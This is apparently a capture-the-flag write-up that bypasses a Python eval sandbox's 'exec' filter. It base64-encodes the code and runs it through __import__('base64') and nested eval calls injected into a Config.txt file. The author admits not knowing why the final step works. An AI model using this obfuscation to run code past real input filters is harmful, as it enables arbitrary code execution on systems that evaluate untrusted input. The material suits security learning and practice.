This Is The Part That I Think Its Really Challenging And Fun :)

In This Part We Can Not Easily Use exec Function Or Anything That Contains exec.
We Can Do An Encoding Trick And Use exec ! Simply, We Can Convert Previous Challenge Code
 To Base64 After That Tries To Decode It. After That We Can Execute Whatever We Want !

For Example Code That We Want To Run Is : 

```
# You Can Write Any Code That You Want In Here But Its Challenge Answer Now
exec("username='pwnninja';password='s3cr3t'")
```


Now Simply We Convert This To base64. This Will Be base64 Of The Code :

```
ZXhlYygidXNlcm5hbWU9J3B3bm5pbmphJztwYXNzd29yZD0nczNjcjN0JyIp
```

There Is One Other Thing That You Can Not import libraries in eval function, Then
How You Can Decode This base64 ? Simply There Is '__import__("module_name")' Is Here To
Help You !

Our Plan Is To Import base64 Library And Decode This base64 That Contains exec Function. After That
We Execute base64 Decoded String !

We Should Add This Code To Config.txt File :

```
__import__('base64').b64decode('ZXhlYygidXNlcm5hbWU9J3B3bm5pbmphJztwYXNzd29yZD0nczNjcjN0JyIp')
```

If You Add This Code To Config.txt File Still You Can Not Win, Why ?
Because After Executing This Just We Deocde base64 But We Can Not Still Execute It !
Then Just We Should Add Another eval To Make Everything Work. In Fact We Decode base64 Once
With Our Eval Function After That exec Function Appears That We Can Execute !

```
eval("__import__('base64').b64decode('ZXhlYygidXNlcm5hbWU9J3B3bm5pbmphJztwYXNzd29yZD0nczNjcjN0JyIp')")
```

Again We Lose :/ Why ? Really I dont Know But I Added One Other eval And It Worked XD

```
eval(eval("__import__('base64').b64decode('ZXhlYygidXNlcm5hbWU9J3B3bm5pbmphJztwYXNzd29yZD0nczNjcjN0JyIp')"))
```
